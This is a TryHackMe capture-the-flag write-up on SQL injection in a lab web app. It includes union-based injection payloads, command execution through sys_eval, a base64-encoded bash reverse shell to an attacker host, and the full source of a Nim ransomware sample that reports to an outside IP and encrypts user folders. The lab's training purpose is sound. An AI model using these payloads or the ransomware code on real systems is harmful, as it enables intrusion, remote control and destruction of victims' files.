# TryHack3M: Sch3Ma D3Mon

Welcome to the second challenge of the 3 million special on TryHackMe, here is the official [page](https://tryhackme.com/r/room/sch3mad3mon).<br>
This time we are gonna practice with some SQL Injection. <br>
The challenge is also presented with a guide on some theory topics already in the official room, here i will just present my experience of doing it.

Notice also that this challenge is at higher difficutly compared to the first one flagged as easy vs this at medium; but don't get discouraged, it's a great opportunity to learn and practice.

Whenever you feel ready download the task file, unzip it and start the machine and connect via OpenVPN or AttackBox.

<br/>
<br/>

## The Story
After weeks of meticulous observation and planning, we pinpointed the public computer that the suspect uses to access their website. The computer is located in a quiet corner of the local library. Although the computer has a warning sign that **all computer activity is monitored**, the suspect doesn’t seem to care. They only check for installed key loggers before establishing a VPN connection and logging in to their criminal marketplace. This time, we were ready:

- We have set the browser to log the session’s TLS keys; this logging was achieved by adding an extra option to the browser shortcut. Executing `chromium --ssl-key-log-file=~/ssl-key.log` dumps the TLS keys to the `ssl-key.log` file.
- We were capturing all traffic on that computer.

To retrive the log file download the task attachment, it contains both the traffic capture that can be seen with Wireshark and the TLS keylog file; alternatively navigate to `/root/Rooms/TryHack3M/sch3MaD3Mon` on the AttackBox.

<br/>
<br/>

## The Challenge

### Traffic Analysis with Wireshark
Now we have everything to start the first step of the investigation and answer the 2 questions of Task1.

To begin we will use Wireshark, a GUI tool for packet analysis.

Open the `.pcapng` file with Wireshark, we can see that all the traffic is encrypted with TLS, navigate to **edit > preferences > protocol > TLS** 
Here we can insert the ssl-key.log file in the master-secret-log-filename field.

Go back to the main screen in Wireshark and we can now notice that some traffic has been decrypted and shows HTTP protocol, let's filter for that type of traffic
```
http
```

Here inspect some packets, the ones i went for where the TCP traffic after the login as it should contain the user information in the headers:
```
tcp.stream eq 4
```

And yes it contains the uid and password uid=REDACTED&password=REDACTED, we can submit them and move to task 2.

<br/>

### SQL Database
Start che machine and connect with OpenVPN or AttackBox if you haven't already.

Visit the website http://MACHINE-IP:8000 and login with the credentials just found.
We have a screen with a search function, by clicking on **show all** we can see a table with 4 columns containing different products.

If we try to insert a string like "test" into the search-bar and submit it nothing seems happens, so i went to check the source code of the webpage and there is a coment telling us that we can enable the the debuug mode by adding `?debug=true` at the end of the URL.

Let's try again, with the debug mode on, to submit a search, this time we get more information displayed, a full SQL query:
```sql
SELECT * FROM products WHERE product_name LIKE 'test%'
```

This gives us some important information: 
- the data is stored in an SQL database;
- we know the query that has been performed, so we maybe can inject some SQL code to get other information.

The scheme on the challenge goes on explaining what RBDMS are, what SQL is and that we can mainly perform 4 actions known with the acronym CURD:
- Create
- Update
- Read 
- Delete

SQL is a Structured Query Language used to manage Relational Databases.
SQL Injections is a type of attack where we try to insert SQL code to manipulate the query and alter the database or escape the original query to gain information on data we should not have access to. <br>
We can do it by understanding and exploiting the SQL query and syntax logic, using some common payloads or crafting specific ones for the need.
To automate the process we also have some nice tools like *sqlmap* that can come in aid.

If you are new to this topic i suggest to read the well made documentation provided with the challenge.

When you are ready to move on answer the 3 questions with the information you just learned, now we can move to the injection phase.

<br/>

### Injection
We can try to insert some other chars and words to see the error messages that we get and it looks like there is no proper input sanitization, all what we submit goes directly into the SQL query and let's us perform actions.
You can try with characters like `'` and SQL operators, or just use the examples provided like `' union select 1,2,3,4,5 -- //` which will show a table.
This means that the application if vulnerable to SQL Injections, now we need to think about what we want it to perform and find for us.

Clicking the **show all** button we can notice an hint in the last product, telling us that another table exists and it's name is `unlisted_products`, with this knowledge we can craft a payload to see it's content:
```sql
' union SELECT * from unlisted_products -- //
```

It works! and now we have the hidden path: --> REDACTED

Navigate to the new discovered path
```http
http://MACHINE_IP:8000/os_sqli.php
```

Here we have the title/hint for the next steps we are gonna perform, which is executing OS commands trough an SQL query.

<br/>

### Shell Commands with SQL
The new task tells us that the MySQL, `lib_mysqludf_sys.so` provides the functionality to execute shell commands with SQL queries, and it is loaded and enabled.
The room also provided some examples of how this works and it gives us an example one might run to check if this method is working.

Here is the URL with the SQL query
```http
http://MACHINE_IP:8000/unlisted?user=lannister' union SELECT null, sys_eval('whoami') -- //
```

But we know this wont work on the machine and we have to do some changes:
- firstly we change `/unlisted` with the hidden path we have just found `/os_sqli.php`
- we can also enable the debug information in this page, we know it by checking the source code, so add `?debug=true&`, the `&` is to continue with the rest of the statement.
- the column count is not right, after a couple of tests i discovered that are 4, you can now it just by typing more `null` and stop when you get the command output

The new URL will be:
```http
http://MACHINE_IP:8000/os_sqli.php?debug=true&user=lannister' union SELECT null, null, null, null, sys_eval('whoami') -- //
```

The command output is in the description and is "mysql", we successfully tested that is possible to execute shell commands, now change "whoami" with the print working directory command "pwd" and submit the answer --> REDACTED

Moving to the next task it tells that we have discovered that inside the home directory there are some receipts but unfortunately were all encrypted, probably by the same group of the first challenge that was dealing with Bitcoins.

I went to check the home directory and there is another directory called "receipts", inside there are 9 encrypted text files.

We can then later execute the cat command for every file, copy the content and create a file on our machine, but this looks too boring so i decided to check if i could get a reverse shell.

<br/>

### Getting a Shell
I firstly tried with a *netcat* payload but got blocked, my second idea, since i checked for python was to get a python reverse shell with curl from my machine and than run it but this didn't work as well for some reason.

Third try, time to encode, back to bash i decided to create this payload
```bash
sh -i >& /dev/tcp/ATTACKER_IO/1234 0>&1
```

Then encode it in base64, maybe there is some kind of detection going on. After i can pipe that to to base64 command to decode it and pipe it again to /bin/bash to execute.

So on our machine set up a listener
```bash
nc -lvnp 1234
```

Now send the payload and activate the shell
```http
http://MACHINE_IP:8000/os_sqli.php?debug=true&user=lannister' UNION SELECT null, null, null, null, sys_eval('echo YOUR_BASE64_ENCODED_PAYLOAD |base64 -d | /bin/bash') -- //
```

Finally we got a shell!
We can do the usual job to upgrade it now.

<br>

### Back to Task 5
We also see this hint in task 5: <br>
"You recall that you can query information regarding a database and its schema instead of querying a table, querying (for example) `information_schema.columns where table_schema=database()`. From here, you can grab information like table_name and column_name. Going back to `searchproducts.php`, can you use this knowledge to gather Bitcoin sender address information to unlock these receipts for investigation?"

So we have to retrive a Bitcoin address to unlock the receipts.

We can go back to the search page to do some other recon and find what we need:
```http
http://MACHINE_IP:8000/searchproducts.php
```

I decided to try with a similar version of the proposed command, to see what happens:
```sql
' UNION SELECT * FROM information_schema.columns WHERE table_schema=database() -- //
```

But there is still some work to do on it, as i got the error that the number of columns is not ok, plus there are some other things to change to make it work...
After some tries this one worked:
```sql
' UNION SELECT null, null, null, group_concat(table_name, 0x0a), null FROM information_schema.tables WHERE table_schema = database() -- //
```
where `0x0a` is the hexadecimal value for the ASCII new line character, as it gave an error using `\n`.

Now we have a full list of the tables:
```
easter_egg ,leaderboard_stats ,member_stats ,products ,room_stats ,streak_stats ,transactions ,unlisted_products ,users
```
<br>

---
### Easter Egg 
Let's take a second from the actual challenge, since there is a table called easter_egg i am curios to see what it contains:
```sql
' UNION SELECT null, null, null,column_name, null FROM information_schema.columns WHERE table_name='easter_egg' -- //
```

doing this we can see a message in the description that says `url_path`, we can move on this path and construct another query
```sql
' UNION SELECT null, null, null, group_concat(message, url_path), null FROM easter_egg -- //
```

Here there is a message telling us to check /halloffame.php, visiting it there is a static leaderboard to celebrate the 3 million users.

---
Ok back to the challenge, we can take a look at the transactions table:
```sql
' UNION SELECT null, null, null, group_concat(0x0a,column_name,0x0a), null FROM information_schema.columns WHERE table_name='transactions' -- //
```

Now let's get the address:
```sql
' UNION SELECT null, null, null, group_concat(0x0a,transaction_number,0x7c,transaction_ammount,0x7c,bcoin_sender_address,0x7c,bcoin_recipient_address), null FROM transactions -- // 
```
Here i had to introduce `0x7c` which is `|` symbol and arrange the order a couple of times to make it less chaotic and more readable.

And here it is: REDACTED
Now we have the key, time to decrypt the message.

We are being told that the files were encrypted using the *gpg* command and we can decrypt them with:
```bash
gpg --decrypt 300000.txt.gpg
```

The content is the path of the malware: --> REDACTED

<br/>

### Examining the Malware
The last task tells us that we have to "defang the malware" in order to stop it from causing damage but at the same time make the attackers believe it is still working.
We are told to explore the malware directory and there we will find something that tells us how to disable its damaging effects.

Navigate to the path to check what is inside of the malware file:
```bash
cd REDACTED
```

Let's view the malware file now:
```bash
cat mmmbar.nim
```

```nim
import os
import strformat
import httpclient
import nimcrypto
import base64
import json
import winim

# Added function to check for the debug mode in the config file
func isDebugEnabled(): bool =
  let configFile = getCurrentDir() & DirSep & "config.json" # Assuming JSON format for simplicity
  if fileExists(configFile):
    let configContent = readFile(configFile)
    let configJson = parseJson(configContent)
    if "debug" in configJson:
      return configJson["debug"].getBool()
  return false

func toByteSeq*(str: string): seq[byte] {.inline.} =
    @(str.toOpenArrayByte(0, str.high))

proc change_wp(isDebug: bool): void =
  if not isDebug:
    var client = newHttpClient()
    var user = getEnv("USERNAME")
    var hostname = getEnv("COMPUTERNAME")
    var report_url = fmt"http://172.16.251.121/aaaaa_ransom.jpg?user={user}&hostname={hostname}"
    var req = client.getContent(report_url)

    var dump = getTempDir() & "paymeboogey.jpg"
    writeFile(dump, req)

    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, cast[PVOID](dump.cstring), SPIF_UPDATEINIFILE or SPIF_SENDCHANGE)

proc recursive(path: string, isDebug: bool): void =
  for file in walkDirRec path:
    let fileSplit = splitFile(file)
    let password: string = "myKey"
    if fileSplit.ext != ".boogey" and fileSplit.ext != ".ini":
      echo fmt"[*] Encrypting: {file}"
      var
          inFileContents: string = readFile(file)
          plaintext: seq[byte] = toByteSeq(inFileContents)
          ectx: CTR[aes256]
          key: array[aes256.sizeKey, byte]
          iv: array[aes256.sizeBlock, byte]
          encrypted: seq[byte] = newSeq[byte](len(plaintext))

      iv = [byte 183, 142, 238, 156, 42, 43, 248, 100, 125, 249, 192, 254, 217, 222, 34, 12]
      var expandedKey = sha256.digest(password)
      copyMem(addr key[0], addr expandedKey.data[0], len(expandedKey.data))

      ectx.init(key, iv)
      ectx.encrypt(plaintext, encrypted)
      ectx.clear()

      if not isDebug:
        let encodedCrypted = encode(encrypted)
        let finalFile = file & ".boogey"
        moveFile(file, finalFile)
        writeFile(finalFile, encodedCrypted)

let debugEnabled = isDebugEnabled()
change_wp(debugEnabled)
var path = getHomeDir() & "Documents"
recursive(path, debugEnabled)
path = getHomeDir() & "Downloads"
recursive(path, debugEnabled)
path = getHomeDir() & "Desktop"
recursive(path, debugEnabled)

```

It is a Nim script, here we can go and read the extension that gets added at the end of ecrypted files: --> REDACTED

Back into the folder, open the README file:
```bash
cat readme.txt
```

We get this message 
"*Hey! Quick heads-up. For testing purposes, you can skip the encryption step just by REDACTED .
The malware would still run, but it won't have any damaging effects to your machine.*
*Keep on hacking!*"

Let's change the value
```bash
REDACTED
```

Finally we can get the last flag by compiling the malware with the script in the directory:
```bash
./build.sh
```

Here it is: --> REDACTED

<br>
<br>

Congratulations, you have completed the second room of the 3 million special series, hope you had fun practicing and following along.

See you in the next challenge 😃
